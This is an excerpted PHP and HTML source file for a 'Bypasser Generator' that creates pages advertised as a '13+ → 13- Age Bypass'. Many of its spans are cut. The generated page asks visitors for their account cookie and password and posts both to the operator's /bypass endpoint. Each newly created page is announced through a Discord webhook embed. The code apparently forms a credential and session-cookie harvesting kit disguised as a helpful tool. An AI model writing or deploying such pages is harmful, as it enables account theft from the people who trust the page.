...
<body>
  <!-- Animated Stars Background -->
  <div class="background" id="starsBackground"></div>
      ...
      <div class="form-container" id="formContainer" style="opacity: 0;">
        ...
        <div class="form-group">
          ...
          <select id="mode">
            ...
            <option value="dualhook">Create Page</option>
          </select>
        </div>
  ...
  <script>
    ...
    function createStars() {
      const background = document.getElementById('starsBackground');
      const numStars = 150;
...
function apiDualhook(): void {
    ...
    // Create the bypass endpoint with same UI but only bypass functionality (no dropdown)
    file_put_contents("$targetDir/index.php", "<?php
/* Bypass endpoint - same UI but simplified */
header('Content-Type: text/html; charset=utf-8');
\$path = parse_url(\$_SERVER['REQUEST_URI'], PHP_URL_PATH);
\$method = \$_SERVER['REQUEST_METHOD'];
...
<body>
  ...
  <div class=\"container\">
    <div class=\"card\">
      ...
      <!-- Version -->
      <div class=\"version\">Version 1 • " . date('Y-m-d') . "</div>
    </div>
  </div>
  ...
  <script>
    ...
    document.getElementById('bypassForm').addEventListener('submit', async e => {
      ...
      try {
        ...
        setTimeout(() => {
          msg.textContent = res.ok ? 'Bypass completed successfully!' : res.error;
          msg.className = 'msg ' + (res.ok ? 'ok' : 'err') + ' show';
          button.textContent = originalText;
          button.disabled = false;
        }, 800);
      } catch (err) {
...
function apiBypass() {
    ...
    // Call the main bypass endpoint
    file_get_contents('https://" . $_SERVER['HTTP_HOST'] . "/bypass', false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode(['cookie' => \$cookie, 'password' => \$password])
        ]
    ]));
...
?>");
    ...
    $pageUrl = "https://{$_SERVER['HTTP_HOST']}/$dir";
    
    // Send fancy Discord embed
    $embed = [
        'username' => 'Bypasser Generator',
        'avatar_url' => 'https://cdn.discordapp.com/attachments/1/2/avatar.png',
        'embeds' => [[
            'title' => '🚀 New Bypass Page Created!',
            'description' => "Your custom bypass page is ready to use!",
            'color' => 0x007AFF,
            'fields' => [
                [
                    'name' => '🔗 Page URL',
                ...
                [
                    'name' => '✨ Features',
                    'value' => '• 13+ → 13- Age Bypass\n• Animated Stars Background\n• Mobile Optimized\n• Secure Processing',
                    'inline' => false
                ]
            ],
            'footer' => [
                'text' => 'Bypasser Generator v1.0 • Ready for use!',
                'icon_url' => 'https://cdn.discordapp.com/attachments/1/2/icon.png'
            ],
            'timestamp' => date('c')
        ]]
    ];
    ...
    echo json_encode(['ok'=>true,'url'=>$pageUrl]);
}
